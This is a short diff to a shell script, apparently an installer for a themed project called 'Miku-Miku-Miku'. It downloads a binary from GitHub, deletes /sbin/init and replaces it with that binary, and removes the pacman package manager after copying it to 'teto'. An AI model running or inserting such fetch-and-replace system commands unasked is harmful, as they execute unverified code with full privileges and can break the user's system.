@@ -3,6 +3,10 @@
 mkdir -p /miku
 cd /miku
 wget https://github.com/Hyperion0801/Miku-Miku-Miku/releases/download/AlphaBuild2/Assets.zip
-wget https://github.com/Hyperion0801/Miku-Miku-Miku/releases/download/AlphaBuild5/init
+wget https://github.com/Hyperion0801/Miku-Miku-Miku/releases/download/AlphaBuild6/init
 chmod +x init
-cp -f init /sbin/init
+rm /sbin/init
+cp init /sbin/init
+unzip Assets.zip
+cp /usr/bin/pacman /usr/bin/teto
+rm /usr/bin/pacman
